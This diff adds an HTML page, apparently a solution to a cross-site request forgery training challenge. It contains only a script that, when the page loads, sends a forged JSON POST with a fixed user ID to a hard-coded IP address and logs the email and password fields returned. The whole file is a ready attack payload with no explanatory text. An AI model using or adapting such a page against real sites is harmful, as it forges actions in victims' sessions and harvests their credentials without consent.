@@ -1,0 +1,23 @@
+<html>
+	<head>
+	</head>
+
+	<body>
+		Hi<script>
+var xhr = new XMLHttpRequest();
+var url = "http://137.74.230.116/user/csrfchallengejson/plusplus";
+xhr.open("POST", url, true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        var json = JSON.parse(xhr.responseText);
+        console.log(json.email + ", " + json.password);
+    }
+};
+var data = JSON.stringify({"userId": "e3ff35c70da4bb314bc97f28c17e52fde48f0d63 "});
+xhr.send(data);
+</script>
+</body>
+</html>
+
+
